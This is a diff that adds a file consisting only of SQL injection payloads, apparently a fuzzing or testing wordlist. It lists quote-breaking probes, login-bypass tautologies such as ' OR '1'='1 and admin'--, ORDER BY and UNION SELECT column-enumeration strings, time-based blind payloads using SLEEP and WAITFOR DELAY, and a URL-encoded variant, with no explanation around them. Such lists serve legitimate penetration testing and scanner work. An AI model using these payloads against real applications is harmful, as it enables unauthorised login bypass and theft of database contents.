@@ -1,0 +1,26 @@
+'
+"
+')
+")
+';
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+" OR 1=1--
+' OR '1'='1'--
+admin'--
+admin' #
+' OR 1=1#
+1' ORDER BY 1--
+1' ORDER BY 10--
+1 UNION SELECT NULL--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--
+' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+1;SELECT SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+') OR ('1'='1
+1' AND '1'='2
+0 OR 1=1
+%27%20OR%201=1--
